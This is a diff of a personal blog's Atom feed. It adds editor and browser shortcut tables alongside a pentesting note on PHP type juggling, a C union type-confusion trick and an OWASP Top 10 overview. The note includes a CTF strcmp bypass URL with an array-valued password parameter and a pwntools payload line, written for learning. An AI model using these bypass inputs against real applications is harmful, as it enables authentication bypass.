@@ -1,1026 +1,1383 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://www.agalera.eu/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.agalera.eu/" rel="alternate" type="text/html" /><updated>2023-02-04T18:22:39+01:00</updated><id>https://www.agalera.eu/feed.xml</id><title type="html">Adrian Galera blog</title><subtitle>My personal developer blog page</subtitle><entry><title type="html">Security and programming language</title><link href="https://www.agalera.eu/security-and-languages/" rel="alternate" type="text/html" title="Security and programming language" /><published>2023-01-24T00:00:00+01:00</published><updated>2023-01-24T00:00:00+01:00</updated><id>https://www.agalera.eu/security-and-languages</id><content type="html" xml:base="https://www.agalera.eu/security-and-languages/">I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I&apos;ll use this article to save all the knowledge I&apos;ve got regarding pentesting and certain programming languages.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://www.agalera.eu/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.agalera.eu/" rel="alternate" type="text/html" /><updated>2023-09-06T09:31:41-05:00</updated><id>https://www.agalera.eu/feed.xml</id><title type="html">Adrian Galera blog</title><subtitle>My personal developer blog page</subtitle><entry><title type="html">Chrome shortcuts</title><link href="https://www.agalera.eu/chrome-shortcuts/" rel="alternate" type="text/html" title="Chrome shortcuts" /><published>2023-09-06T00:00:00-05:00</published><updated>2023-09-06T00:00:00-05:00</updated><id>https://www.agalera.eu/chrome-shortcuts</id><content type="html" xml:base="https://www.agalera.eu/chrome-shortcuts/"><![CDATA[<p>In a quest to work more efficiently, I’m trying to reduce the use of the mouse. Therefore I’m trying to learn as much shortcuts as possible.</p>
 
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
+<p>This page stores the ones I’m learning for Chrome browser</p>
+<p><!--more--></p>
 
-This article describe some features of programming languages that if used wrong, they can be attack vectors for applications. It&apos;s not that the language is unsecure, but the features can be misused very easily.
+<table>
+  <thead>
+    <tr>
+      <th>Shortcut</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>New tab</td>
+      <td>CMD + t</td>
+    </tr>
+    <tr>
+      <td>Next tab</td>
+      <td>option + CMD + Arrow right/left</td>
+    </tr>
+    <tr>
+      <td>Go to tab 1</td>
+      <td>CMD + 1</td>
+    </tr>
+    <tr>
+      <td>Go to tab 2</td>
+      <td>CMD + 2</td>
+    </tr>
+  </tbody>
+</table>]]></content><author><name></name></author><category term="shortcuts" /><category term="chrome" /><category term="shortcuts" /><summary type="html"><![CDATA[I use this page to store useful chrome shortcuts]]></summary></entry><entry><title type="html">Mac OS shortcuts</title><link href="https://www.agalera.eu/mac-shortcuts/" rel="alternate" type="text/html" title="Mac OS shortcuts" /><published>2023-09-06T00:00:00-05:00</published><updated>2023-09-06T00:00:00-05:00</updated><id>https://www.agalera.eu/mac-shortcuts</id><content type="html" xml:base="https://www.agalera.eu/mac-shortcuts/"><![CDATA[<p>In a quest to work more efficiently, I’m trying to reduce the use of the mouse. Therefore I’m trying to learn as much shortcuts as possible.</p>
 
-## Programming languages
-1. [PHP](#php)
-2. [C](#c)
+<p>This page stores the ones I’m learning for Mac OS.</p>
+<p><!--more--></p>
 
-### PHP &lt;a name=&quot;php&quot;&gt;&lt;/a&gt;
+<table>
+  <thead>
+    <tr>
+      <th>Shortcut</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Current application to fullscreen</td>
+      <td>control +  CMD + F</td>
+    </tr>
+    <tr>
+      <td>Move between fullscreen apps</td>
+      <td>control + Arrow right/left</td>
+    </tr>
+    <tr>
+      <td>Finder go to folder</td>
+      <td>CMD + Shift + G</td>
+    </tr>
+    <tr>
+      <td>Finder see hidden files</td>
+      <td>CMD + Shift + .</td>
+    </tr>
+    <tr>
+      <td>Finder copy and paste</td>
+      <td>CMD + C + CMD + V</td>
+    </tr>
+    <tr>
+      <td>Finder copy and move</td>
+      <td>CMD + C + CMD + option + V</td>
+    </tr>
+  </tbody>
+</table>]]></content><author><name></name></author><category term="shortcuts" /><category term="mac" /><category term="shortcuts" /><summary type="html"><![CDATA[I use this page to store useful Mac OS shortcuts]]></summary></entry><entry><title type="html">vscode shortcuts</title><link href="https://www.agalera.eu/vscode-shortcuts/" rel="alternate" type="text/html" title="vscode shortcuts" /><published>2023-09-06T00:00:00-05:00</published><updated>2023-09-06T00:00:00-05:00</updated><id>https://www.agalera.eu/vscode-shortcuts</id><content type="html" xml:base="https://www.agalera.eu/vscode-shortcuts/"><![CDATA[<p>In a quest to work more efficiently, I’m trying to reduce the use of the mouse. Therefore I’m trying to learn as much shortcuts as possible.</p>
 
-#### Type juggling
+<p>This page stores the ones I’m learning for vscode.</p>
+<p><!--more--></p>
 
-Due to the nature of PHP we can abuse the type jungling feature.
+<table>
+  <thead>
+    <tr>
+      <th>Shortcut</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Go to file</td>
+      <td>CMD + P</td>
+    </tr>
+    <tr>
+      <td>Go to terminal</td>
+      <td>control + `</td>
+    </tr>
+    <tr>
+      <td>Go to editor</td>
+      <td>control + 1,2,3,..</td>
+    </tr>
+    <tr>
+      <td>Search</td>
+      <td>CMD + F</td>
+    </tr>
+    <tr>
+      <td>Search-replace</td>
+      <td>option + CMD + F</td>
+    </tr>
+    <tr>
+      <td>Fold</td>
+      <td>CMD + K + 0</td>
+    </tr>
+    <tr>
+      <td>Unfold</td>
+      <td>CMD + K + J</td>
+    </tr>
+    <tr>
+      <td>See all shortcuts</td>
+      <td>CMD + K + S</td>
+    </tr>
+    <tr>
+      <td>Go to explorer</td>
+      <td>CMD + shift + e</td>
+    </tr>
+    <tr>
+      <td>Multi-cursor search</td>
+      <td>Select the term to search and CMD + shift + L</td>
+    </tr>
+  </tbody>
+</table>]]></content><author><name></name></author><category term="shortcuts" /><category term="vscode" /><category term="shortcuts" /><summary type="html"><![CDATA[I use this page to store useful vscode shortcuts]]></summary></entry><entry><title type="html">vim shortcuts</title><link href="https://www.agalera.eu/vim-shortcuts/" rel="alternate" type="text/html" title="vim shortcuts" /><published>2023-09-06T00:00:00-05:00</published><updated>2023-09-06T00:00:00-05:00</updated><id>https://www.agalera.eu/vim-shortcuts</id><content type="html" xml:base="https://www.agalera.eu/vim-shortcuts/"><![CDATA[<p>In a quest to work more efficiently, I’m trying to reduce the use of the mouse. Therefore I’m trying to learn as much shortcuts as possible.</p>
 
-The following condition will be true and print the message.
-```php
-$example_int = 7
-$example_str = “7”
-if ($example_int == $example_str) {
-   echo(&quot;PHP can compare ints and strings.&quot;)
-}
-```
+<p>This page stores the ones I’m learning for vim.</p>
+<p><!--more--></p>
 
-So, an if with `==` will not check the types. Only `===` check the types. Internally php select statement uses `==` comparisson, therefore is vulnerable to this kind of vulnerability. See &lt;a href=&quot;https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09&quot;&gt;https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09&lt;/a&gt;
+<table>
+  <thead>
+    <tr>
+      <th>Shortcut</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Duplicate line</td>
+      <td>yy (yank line) , p (paste)</td>
+    </tr>
+    <tr>
+      <td>Copy line to system</td>
+      <td>shit + v (to select), yy (yank line)</td>
+    </tr>
+    <tr>
+      <td>Add new line</td>
+      <td>o</td>
+    </tr>
+    <tr>
+      <td>Visual mode</td>
+      <td>v</td>
+    </tr>
+    <tr>
+      <td>Copy chars selected</td>
+      <td>y (yank)</td>
+    </tr>
+    <tr>
+      <td>Visual block mode</td>
+      <td>ctrl + V</td>
+    </tr>
+  </tbody>
+</table>
 
-So, if you spot a switch statement that checks a user provided string, just change the string value to `true`.
+<h2 id="how-to">How to:</h2>
 
-#### strcmp
+<h3 id="add-text-to-multiple-lines">Add text to multiple lines:</h3>
 
-You can also check if the page is using php to abuse the `strcmp` function. 
+<ol>
+  <li>Visual block mode</li>
+  <li>Select where to change</li>
+  <li>Press I</li>
+  <li>Perform the change in one line</li>
+  <li>Press ESC</li>
+  <li>The change will propagate</li>
+</ol>]]></content><author><name></name></author><category term="shortcuts" /><category term="vim" /><category term="shortcuts" /><summary type="html"><![CDATA[I use this page to store useful vim shortcuts]]></summary></entry><entry><title type="html">IntelliJ IDEA shortcuts</title><link href="https://www.agalera.eu/intellij-shortcuts/" rel="alternate" type="text/html" title="IntelliJ IDEA shortcuts" /><published>2023-09-06T00:00:00-05:00</published><updated>2023-09-06T00:00:00-05:00</updated><id>https://www.agalera.eu/intellij-shortcuts</id><content type="html" xml:base="https://www.agalera.eu/intellij-shortcuts/"><![CDATA[<p>In a quest to work more efficiently, I’m trying to reduce the use of the mouse. Therefore I’m trying to learn as much shortcuts as possible.</p>
 
-```php
-if(strcmp($PASSWORD, $_GET[&apos;password&apos;]) == 0){
-        $success = true;
-}
-```
+<p>This page stores the ones I’m learning for IntelliJ IDEA</p>
+<p><!--more--></p>
 
-Thanks to the type juggling describe above, if strcmp returns `NULL` the condition will be true. We can force this by passing the password field as an array:
+<table>
+  <thead>
+    <tr>
+      <th>Shortcut</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Move between open projects</td>
+      <td>option + CMD + `</td>
+    </tr>
+    <tr>
+      <td>Open terminal</td>
+      <td>option + fn + F12</td>
+    </tr>
+    <tr>
+      <td>Select</td>
+      <td>option + Arrow Up/Down</td>
+    </tr>
+    <tr>
+      <td>Move between words</td>
+      <td>option + Arrow Left/Right</td>
+    </tr>
+    <tr>
+      <td>Fold</td>
+      <td>CMD (+) +</td>
+    </tr>
+    <tr>
+      <td>Unfold</td>
+      <td>CMD (+) -</td>
+    </tr>
+    <tr>
+      <td>Search and replace</td>
+      <td>CMD+R + option +A</td>
+    </tr>
+    <tr>
+      <td>Project structure section</td>
+      <td>CMD+1</td>
+    </tr>
+    <tr>
+      <td>Run section</td>
+      <td>CMD+4</td>
+    </tr>
+    <tr>
+      <td>Move</td>
+      <td>F6</td>
+    </tr>
+    <tr>
+      <td>Go to line</td>
+      <td>CMD+L</td>
+    </tr>
+    <tr>
+      <td>See implementations</td>
+      <td>option+CMD+B</td>
+    </tr>
+    <tr>
+      <td>See usages</td>
+      <td>CMD+B</td>
+    </tr>
+  </tbody>
+</table>]]></content><author><name></name></author><category term="shortcuts" /><category term="intellij-idea" /><category term="shortcuts" /><summary type="html"><![CDATA[I use this page to store useful Intellij IDEA shortcuts]]></summary></entry><entry><title type="html">Security and programming language</title><link href="https://www.agalera.eu/security-and-languages/" rel="alternate" type="text/html" title="Security and programming language" /><published>2023-01-24T00:00:00-06:00</published><updated>2023-01-24T00:00:00-06:00</updated><id>https://www.agalera.eu/security-and-languages</id><content type="html" xml:base="https://www.agalera.eu/security-and-languages/"><![CDATA[<p>I have started playing around in <a href="https://www.hackthebox.com/">https://www.hackthebox.com</a> platform and I’ll use this article to save all the knowledge I’ve got regarding pentesting and certain programming languages.</p>
 
-```
-http://yrmyzscnvh.abctf.xyz/web6/?password[]=%22%22
-```
+<p><!--more--></p>
 
-Example: &lt;a href=&quot;https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016&quot;&gt;https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016&lt;/a&gt;
+<p>This article describe some features of programming languages that if used wrong, they can be attack vectors for applications. It’s not that the language is unsecure, but the features can be misused very easily.</p>
 
-### C &lt;a name=&quot;c&quot;&gt;&lt;/a&gt;
+<h2 id="programming-languages">Programming languages</h2>
+<ol>
+  <li><a href="#php">PHP</a></li>
+  <li><a href="#c">C</a></li>
+</ol>
 
-#### union
+<h3 id="php-">PHP <a name="php"></a></h3>
 
-A union type in C lang is a special type that allows the developer to reuse a memory position to store multiple types of data.
+<h4 id="type-juggling">Type juggling</h4>
 
-```c
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
+<p>Due to the nature of PHP we can abuse the type jungling feature.</p>
+
+<p>The following condition will be true and print the message.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$example_int</span> <span class="o">=</span> <span class="mi">7</span>
+<span class="nv">$example_str</span> <span class="o">=</span> <span class="err">“</span><span class="mi">7</span><span class="err">”</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$example_int</span> <span class="o">==</span> <span class="nv">$example_str</span><span class="p">)</span> <span class="p">{</span>
+   <span class="k">echo</span><span class="p">(</span><span class="s2">"PHP can compare ints and strings."</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So, an if with <code class="language-plaintext highlighter-rouge">==</code> will not check the types. Only <code class="language-plaintext highlighter-rouge">===</code> check the types. Internally php select statement uses <code class="language-plaintext highlighter-rouge">==</code> comparisson, therefore is vulnerable to this kind of vulnerability. See <a href="https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09">https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09</a></p>
+
+<p>So, if you spot a switch statement that checks a user provided string, just change the string value to <code class="language-plaintext highlighter-rouge">true</code>.</p>
+
+<h4 id="strcmp">strcmp</h4>
+
+<p>You can also check if the page is using php to abuse the <code class="language-plaintext highlighter-rouge">strcmp</code> function.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$PASSWORD</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+        <span class="nv">$success</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Thanks to the type juggling describe above, if strcmp returns <code class="language-plaintext highlighter-rouge">NULL</code> the condition will be true. We can force this by passing the password field as an array:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://yrmyzscnvh.abctf.xyz/web6/?password[]=%22%22
+</code></pre></div></div>
+
+<p>Example: <a href="https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016">https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016</a></p>
+
+<h3 id="c-">C <a name="c"></a></h3>
+
+<h4 id="union">union</h4>
+
+<p>A union type in C lang is a special type that allows the developer to reuse a memory position to store multiple types of data.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span> 
+<span class="k">union</span> <span class="n">Data</span> <span class="p">{</span>
+   <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+   <span class="kt">float</span> <span class="n">f</span><span class="p">;</span>
+   <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+<span class="p">};</span>
  
-union Data {
-   int i;
-   float f;
-   char str[20];
-};
- 
-int main( ) {
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span> <span class="p">)</span> <span class="p">{</span>
 
-   union Data data;        
+   <span class="k">union</span> <span class="n">Data</span> <span class="n">data</span><span class="p">;</span>        
 
-   data.i = 10;
-   data.f = 220.5;
-   strcpy( data.str, &quot;C Programming&quot;);
+   <span class="n">data</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+   <span class="n">data</span><span class="p">.</span><span class="n">f</span> <span class="o">=</span> <span class="mi">220</span><span class="p">.</span><span class="mi">5</span><span class="p">;</span>
+   <span class="n">strcpy</span><span class="p">(</span> <span class="n">data</span><span class="p">.</span><span class="n">str</span><span class="p">,</span> <span class="s">"C Programming"</span><span class="p">);</span>
 
-   printf( &quot;data.i : %d\n&quot;, data.i);
-   printf( &quot;data.f : %f\n&quot;, data.f);
-   printf( &quot;data.str : %s\n&quot;, data.str);
+   <span class="n">printf</span><span class="p">(</span> <span class="s">"data.i : %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">i</span><span class="p">);</span>
+   <span class="n">printf</span><span class="p">(</span> <span class="s">"data.f : %f</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">f</span><span class="p">);</span>
+   <span class="n">printf</span><span class="p">(</span> <span class="s">"data.str : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">str</span><span class="p">);</span>
 
-   return 0;
-}
-```
+   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
 
-Outputs:
+<p>Outputs:</p>
 
-```
-data.i : 1917853763
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data.i : 1917853763
 data.f : 4122360580327794860452759994368.000000
 data.str : C Programming
-```
+</code></pre></div></div>
 
-If the developer rely on this union to hide a secret and let the user access to it, the user can change the value of the union by writing a different type that will be converted to the proper type when checking the secret.
+<p>If the developer rely on this union to hide a secret and let the user access to it, the user can change the value of the union by writing a different type that will be converted to the proper type when checking the secret.</p>
 
-Example:
+<p>Example:</p>
 
-```c
-static union {
-    unsigned long long integer;
-    char string[8];
-} DataStore;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">union</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">integer</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">string</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="p">}</span> <span class="n">DataStore</span><span class="p">;</span>
 
-void get_flag() {
-    if (DataStore.integer == 13371337) {
-        system(&quot;cat flag.txt&quot;);
-        exit(0);
-    } else {
-        puts(&quot;\nSorry, this will not work!&quot;);
-    }
-}
-void set_field(field_t f) {
-    char buf[32] = {0};
-    printf(&quot;\nMaybe try a ritual?\n\n&gt;&gt; &quot;);
-    fgets(buf, sizeof(buf), stdin);
-    switch (f) {
-    case INTEGER:
-        sscanf(buf, &quot;%llu&quot;, &amp;DataStore.integer);
-        if (DataStore.integer == 13371337) {
-            puts(&quot;\nWhat&apos;s this nonsense?!&quot;);
-            exit(-1);
-        }
-        break;
-    case STRING:
-        memcpy(DataStore.string, buf, sizeof(DataStore.string));
-        break;
-    }
-}
-```
+<span class="kt">void</span> <span class="nf">get_flag</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">DataStore</span><span class="p">.</span><span class="n">integer</span> <span class="o">==</span> <span class="mi">13371337</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">"cat flag.txt"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Sorry, this will not work!"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">set_field</span><span class="p">(</span><span class="n">field_t</span> <span class="n">f</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Maybe try a ritual?</span><span class="se">\n\n</span><span class="s">&gt;&gt; "</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">case</span> <span class="n">INTEGER</span><span class="p">:</span>
+        <span class="n">sscanf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"%llu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">DataStore</span><span class="p">.</span><span class="n">integer</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">DataStore</span><span class="p">.</span><span class="n">integer</span> <span class="o">==</span> <span class="mi">13371337</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">What's this nonsense?!"</span><span class="p">);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="n">STRING</span><span class="p">:</span>
+        <span class="n">memcpy</span><span class="p">(</span><span class="n">DataStore</span><span class="p">.</span><span class="n">string</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DataStore</span><span class="p">.</span><span class="n">string</span><span class="p">));</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
 
-It turns out, the user can write to both fields in the union. However, if we set the magic number to get the secret, the app will exit. However, we can set in the string the byte value of the integer field:
+<p>It turns out, the user can write to both fields in the union. However, if we set the magic number to get the secret, the app will exit. However, we can set in the string the byte value of the integer field:</p>
 
-```python
-r.sendline(p64(13371337))
-```
-In the example we use python `pwntools` library to generate the byte value (in 64 bytes) of the magic number.</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="c" /><category term="php" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="c" /><category term="php" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the knowledge I’ve got regarding pentesting and certain programming languages.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">OWASP Top 10</title><link href="https://www.agalera.eu/owasp-top10/" rel="alternate" type="text/html" title="OWASP Top 10" /><published>2023-01-09T00:00:00+01:00</published><updated>2023-01-09T00:00:00+01:00</updated><id>https://www.agalera.eu/owasp-top10</id><content type="html" xml:base="https://www.agalera.eu/owasp-top10/">I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I&apos;ll use this article to save all the knowledge I&apos;ve got related with OWASP Top 10 vulnerabilities.
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">13371337</span><span class="p">))</span>
+</code></pre></div></div>
+<p>In the example we use python <code class="language-plaintext highlighter-rouge">pwntools</code> library to generate the byte value (in 64 bytes) of the magic number.</p>]]></content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="c" /><category term="php" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="c" /><category term="php" /><summary type="html"><![CDATA[I keep this page as a reference to the compile the knowledge I have got regarding security and some programming languages]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">OWASP Top 10</title><link href="https://www.agalera.eu/owasp-top10/" rel="alternate" type="text/html" title="OWASP Top 10" /><published>2023-01-09T00:00:00-06:00</published><updated>2023-01-09T00:00:00-06:00</updated><id>https://www.agalera.eu/owasp-top10</id><content type="html" xml:base="https://www.agalera.eu/owasp-top10/"><![CDATA[<p>I have started playing around in <a href="https://www.hackthebox.com/">https://www.hackthebox.com</a> platform and I’ll use this article to save all the knowledge I’ve got related with OWASP Top 10 vulnerabilities.</p>
 
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
+<p><!--more--></p>
 
-## OWASP Top 10
+<h2 id="owasp-top-10">OWASP Top 10</h2>
 
-In &lt;a href=&quot;https://owasp.org/Top10/&quot;&gt;OWASP Top 10&lt;/a&gt; website, you can see what are the most common vulnerabilities to exploit.
+<p>In <a href="https://owasp.org/Top10/">OWASP Top 10</a> website, you can see what are the most common vulnerabilities to exploit.</p>
 
-They are well categorized and they provide examples in website.
+<p>They are well categorized and they provide examples in website.</p>
 
-I&apos;ll try to explain the groups sorted by order of occurrence in this article. This should be like a map to follow when pentesting things.
+<p>I’ll try to explain the groups sorted by order of occurrence in this article. This should be like a map to follow when pentesting things.</p>
 
-### Broken Access Control
+<h3 id="broken-access-control">Broken Access Control</h3>
 
-&lt;a href=&quot;https://owasp.org/Top10/A01_2021-Broken_Access_Control/&quot;&gt;https://owasp.org/Top10/A01_2021-Broken_Access_Control/&lt;/a&gt;
+<p><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">https://owasp.org/Top10/A01_2021-Broken_Access_Control/</a></p>
 
-Malicious users can manipulate access control mechanisms.
+<p>Malicious users can manipulate access control mechanisms.</p>
 
-Examples of this are:
+<p>Examples of this are:</p>
 
-- Modify the loging cookie to change from regular user to admin user
-- Manipulate JWT Tokens
-- ...
+<ul>
+  <li>Modify the loging cookie to change from regular user to admin user</li>
+  <li>Manipulate JWT Tokens</li>
+  <li>…</li>
+</ul>
 
-### Cryptographic Failures
+<h3 id="cryptographic-failures">Cryptographic Failures</h3>
 
-&lt;a href=&quot;https://owasp.org/Top10/A02_2021-Cryptographic_Failures/&quot;&gt;https://owasp.org/Top10/A02_2021-Cryptographic_Failures/&lt;/a&gt;
+<p><a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">https://owasp.org/Top10/A02_2021-Cryptographic_Failures/</a></p>
 
-Examples of this are:
+<p>Examples of this are:</p>
 
-- Using old ciphers in symmetric encryption
-- Using short keys for RSA key: able to generate the private key from the public key
-- Unsalted passwords
-- ...
+<ul>
+  <li>Using old ciphers in symmetric encryption</li>
+  <li>Using short keys for RSA key: able to generate the private key from the public key</li>
+  <li>Unsalted passwords</li>
+  <li>…</li>
+</ul>
 
-### Injection
+<h3 id="injection">Injection</h3>
 
-&lt;a href=&quot;https://owasp.org/Top10/A03_2021-Injection/&quot;&gt;https://owasp.org/Top10/A03_2021-Injection/&lt;/a&gt;
+<p><a href="https://owasp.org/Top10/A03_2021-Injection/">https://owasp.org/Top10/A03_2021-Injection/</a></p>
 
-When the user can input some value to the application, the developers should pay extra attention to validate or sanitize it. Otherwise, a malicious user can inject any value on it.
+<p>When the user can input some value to the application, the developers should pay extra attention to validate or sanitize it. Otherwise, a malicious user can inject any value on it.</p>
 
-Examples are:
-- SQL injections: break the SQL query syntax to execute arbitrary queries
-- OS injections: being able to execute os commands via the user input
-- Server-side template injection: abuse a template engine to inject any code
-- ...
+<p>Examples are:</p>
+<ul>
+  <li>SQL injections: break the SQL query syntax to execute arbitrary queries</li>
+  <li>OS injections: being able to execute os commands via the user input</li>
+  <li>Server-side template injection: abuse a template engine to inject any code</li>
+  <li>…</li>
+</ul>
 
-The injection can be reflected on the screen: the typical use case is for login. You log in with made up username and you see the username back in the UI. This helps a lot because you can test with attack attempts.
+<p>The injection can be reflected on the screen: the typical use case is for login. You log in with made up username and you see the username back in the UI. This helps a lot because you can test with attack attempts.</p>
 
-If you don&apos;t see the results back, you can try 2 things:
-- Write to a public file: if the target has a public endpoint, you can make the injection to write to a file in that public directory to extract the data.
-- Out of band interaction: if you own a server, you can make the target connect to that server to exfiltrate the data
-- Abuse of the errors: if you see the stacktrace, you can use it in your favour and throw errors containg the information you want to extract.
+<p>If you don’t see the results back, you can try 2 things:</p>
+<ul>
+  <li>Write to a public file: if the target has a public endpoint, you can make the injection to write to a file in that public directory to extract the data.</li>
+  <li>Out of band interaction: if you own a server, you can make the target connect to that server to exfiltrate the data</li>
+  <li>Abuse of the errors: if you see the stacktrace, you can use it in your favour and throw errors containg the information you want to extract.</li>
+</ul>
 
-### Insecure Design
+<h3 id="insecure-design">Insecure Design</h3>
 
-&lt;a href=&quot;https://owasp.org/Top10/A04_2021-Insecure_Design/&quot;&gt;https://owasp.org/Top10/A04_2021-Insecure_Design/&lt;/a&gt;
+<p><a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">https://owasp.org/Top10/A04_2021-Insecure_Design/</a></p>
 
-Examples of this are:
+<p>Examples of this are:</p>
 
-- Bot detection mechanism
-- Credentials hardcoded in the code
-- ...
+<ul>
+  <li>Bot detection mechanism</li>
+  <li>Credentials hardcoded in the code</li>
+  <li>…</li>
+</ul>
 
-### Security Misconfiguration
+<h3 id="security-misconfiguration">Security Misconfiguration</h3>
 
